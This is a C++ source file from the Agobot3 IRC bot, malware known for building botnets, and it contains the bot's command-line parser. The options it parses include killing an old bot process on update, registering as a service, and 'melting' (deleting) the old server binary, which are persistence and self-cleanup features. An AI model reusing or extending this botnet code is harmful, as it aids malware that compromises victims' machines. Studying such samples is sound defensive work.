/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "cmdline.h"
#include "cstring.h"

CCmdLine::CCmdLine() { m_szCmdLine=NULL; }
CCmdLine::~CCmdLine() { if(m_szCmdLine) delete [] m_szCmdLine; }

void CCmdLine::Parse(const char *szCmdLine) {
	// Copy command line
	char *szCmdLineCopy; if(m_szCmdLine) delete [] m_szCmdLine;
	m_szCmdLine=new char[strlen(szCmdLine)+1]; strcpy(m_szCmdLine, szCmdLine);

	// Create defaults
#ifndef _DEBUG
	m_cConfig.bDebug=false; m_cConfig.iDebugLevel=0;
#else
	m_cConfig.bDebug=true; m_cConfig.iDebugLevel=10;
#endif // DEBUG

#ifdef DBGCONSOLE
	m_cConfig.bDebug=true; m_cConfig.iDebugLevel=10;
#endif // DBGCONSOLE

	m_cConfig.bUpdate=false;
	m_cConfig.bService=false;
	m_cConfig.bMeltServer=false;
	
	// Tokenize command line
	CString sCmdLineCopy(m_szCmdLine);

	// Scan command line tokens for params
	int iLoop=0; while(sCmdLineCopy.Token(iLoop, " ", true).Compare("")!=0) {
		CString sToken(sCmdLineCopy.Token(iLoop, " ", true));
		if(!sToken.CompareNoCase("-debug")) { // Set the debug mode to enabled
			m_cConfig.bDebug=true;
		} else if(!sToken.CompareNoCase("-debuglevel")) { // Set the debug level to value
			if(sCmdLineCopy.Token(iLoop+1, " ", true).Compare("")!=0)
			{	m_cConfig.iDebugLevel=atoi(sCmdLineCopy.Token(iLoop+1, " ", true).CStr()); iLoop++; }
		} else if(!sToken.CompareNoCase("-update")) { // Kill any old bot filename thats running
			m_cConfig.bUpdate=true;
		} else if(!sToken.CompareNoCase("-service")) { // Register service control handler
			m_cConfig.bService=true;
		} else if(!sToken.CompareNoCase("-meltserver")) { // Delete the old server
			if(sCmdLineCopy.Token(iLoop+1, " ", true).Compare("")!=0)
			{	m_cConfig.bMeltServer=true;
				strncpy(m_cConfig.szOldServer, sCmdLineCopy.Token(iLoop+1, " ", true).CStr(), sizeof(m_cConfig.szOldServer));
				iLoop++; }
		}
		iLoop++; }

	// Zero debug level if not debugging
	if(!m_cConfig.bDebug) m_cConfig.iDebugLevel=0;
	// Lowest debug level as default
	if(!m_cConfig.iDebugLevel && m_cConfig.bDebug) m_cConfig.iDebugLevel=1;

#ifndef DBGCONSOLE
	m_cConfig.bDebug=0; m_cConfig.iDebugLevel=0;
#endif
}
